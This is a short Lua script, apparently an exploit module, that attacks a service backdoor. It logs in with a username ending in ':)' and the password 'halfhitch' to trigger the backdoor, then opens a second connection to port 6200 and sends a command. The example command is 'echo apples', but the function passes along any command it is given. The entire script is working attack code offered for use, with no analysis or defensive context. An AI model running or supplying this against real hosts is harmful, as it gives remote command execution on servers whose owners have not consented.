function start_backdoor(rhost, rport)
    client = sock.socket(sock.AF_INET, sock.SOCK_STREAM, 0)
    client_addr = sock.sockaddr_in(sock.AF_INET, rport, rhost)
    if not sock.connect(client, client_addr) then return false end
    if not sock.send(client, "USER clovehitch:)\n") then return false end
    res_user = sock.recv(client, 1024)
    print(res_user)
    if not sock.send(client, "PASS halfhitch\n") then return false end
    sock.close(client)
    return true
end

function run_backdoor_cmd(rhost, cmd)
    client = sock.socket(sock.AF_INET, sock.SOCK_STREAM, 0)
    client_addr = sock.sockaddr_in(sock.AF_INET, 6200, rhost)
    if not sock.connect(client, client_addr) then return false end
    if not sock.send(client, cmd) then return false end
    res_user = sock.recv(client, 1024)
    return true
end

function main()
    remote_host = g_options["rhost"]
    remote_port = math.floor(g_options["rport"])
   
    if not start_backdoor(remote_host, remote_port) then
        return
    end
    if not run_backdoor_cmd(remote_host, "echo apples") then
        return
    end 
end

main()
